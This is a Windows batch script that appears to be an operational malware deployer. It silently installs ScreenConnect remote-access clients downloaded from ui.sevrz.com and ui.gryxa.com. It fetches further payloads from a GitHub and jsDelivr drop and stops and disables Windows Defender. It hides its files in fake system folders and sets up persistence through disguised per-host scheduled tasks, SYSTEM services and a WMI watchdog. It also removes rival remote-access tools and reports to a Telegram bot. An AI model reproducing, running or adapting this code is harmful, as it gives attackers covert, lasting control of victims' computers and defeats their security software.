@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O36 - gryxa MUST-RUN install/heal + quiet TG + BOOT schtasks
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O36 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O36b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O36" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O36 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O36 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O36: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M26" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S7" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T15" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L14" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O36: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] MUST-RUN Gryxa SC (install+heal until Running)...
call :EnsureGryxaMust

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O36/L13: Create like WucacheOwn — BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) — same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O36 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O36 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem Gryxa is mandatory — climb until Running (never soft-skip on registered).
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo gryxa_already_running>>"%LOG%"
  exit /b 0
)
echo gryxa_must_begin>>"%LOG%"

sc query "%GRYXA%" >nul 2>&1
if not errorlevel 1 (
  echo gryxa_svc_start>>"%LOG%"
  sc config "%GRYXA%" start= auto >nul 2>&1
  sc failure "%GRYXA%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
  net start "%GRYXA%" >nul 2>&1
  sc start "%GRYXA%" >nul 2>&1
  timeout /t 6 /nobreak >nul
  sc start "%GRYXA%" >nul 2>&1
  sc query "%GRYXA%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo gryxa_started_ok>>"%LOG%"
    exit /b 0
  )
)

set "GREG=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP3%" -WorkDir "%WD%"`) do set "GREG=%%R"
echo gryxa_registered=!GREG!>>"%LOG%"
if /I "!GREG!"=="yes" (
  echo gryxa_repair_begin>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP3%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 8 /nobreak >nul
  sc config "%GRYXA%" start= auto >nul 2>&1
  sc start "%GRYXA%" >nul 2>&1
  timeout /t 5 /nobreak >nul
  sc query "%GRYXA%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo gryxa_repaired_ok>>"%LOG%"
    exit /b 0
  )
  echo gryxa_repair_not_running_force_install>>"%LOG%"
)

if /I not "!GREG!"=="yes" (
  sc query "%GRYXA%" >nul 2>&1
  if not errorlevel 1 (
    echo gryxa_orphan_svc_delete>>"%LOG%"
    sc stop "%GRYXA%" >nul 2>&1
    sc delete "%GRYXA%" >nul 2>&1
    timeout /t 3 /nobreak >nul
  )
  if exist "%PF86%\ScreenConnect Client (%KEEP3%)" (
    echo gryxa_stale_dir_clean>>"%LOG%"
    rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP3%)" >nul 2>&1
  )
)

echo gryxa_install_begin>>"%LOG%"
set "G_MSI_READY=0"
if exist "%MSICACHE_G%" for %%F in ("%MSICACHE_G%") do if %%~zF GEQ 500000 (
  call :ForceCopy "%MSICACHE_G%" "%MSI_G%"
  set "G_MSI_READY=1"
  echo gryxa_msi_from_cache>>"%LOG%"
)
if "%G_MSI_READY%"=="0" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%MSI_G%" "%MSIURL_GRYXA%" >>"%LOG%" 2>&1
  if not exist "%MSI_G%" "%CURL%" -L --connect-timeout 30 --max-time 300 -o "%MSI_G%" "%MSIURL_GRYXA%" >>"%LOG%" 2>&1
  for %%A in ("%MSI_G%") do if %%~zA GEQ 500000 (
    call :ForceCopy "%MSI_G%" "%MSICACHE_G%"
    set "G_MSI_READY=1"
    echo gryxa_msi_fetched=%%~zA>>"%LOG%"
  )
)
if "%G_MSI_READY%"=="1" (
  call :NoMsiPolicy
  msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa.log"
  set "GEXIT=!ERRORLEVEL!"
  echo gryxa_msiexec_exit=!GEXIT!>>"%LOG%"
  if "!GEXIT!"=="1618" (
    timeout /t 30 /nobreak >nul
    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa2.log"
    set "GEXIT=!ERRORLEVEL!"
    echo gryxa_msiexec_retry1618=!GEXIT!>>"%LOG%"
  )
  if "!GEXIT!"=="1618" (
    timeout /t 45 /nobreak >nul
    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa3.log"
    set "GEXIT=!ERRORLEVEL!"
    echo gryxa_msiexec_retry1618b=!GEXIT!>>"%LOG%"
  )
  timeout /t 10 /nobreak >nul
) else (
  echo gryxa_msi_fetch_FAIL>>"%LOG%"
)

sc query "%GRYXA%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_postinstall_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP3%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 6 /nobreak >nul
)
sc config "%GRYXA%" start= auto >nul 2>&1
sc failure "%GRYXA%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%GRYXA%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%GRYXA%" >nul 2>&1
timeout /t 5 /nobreak >nul
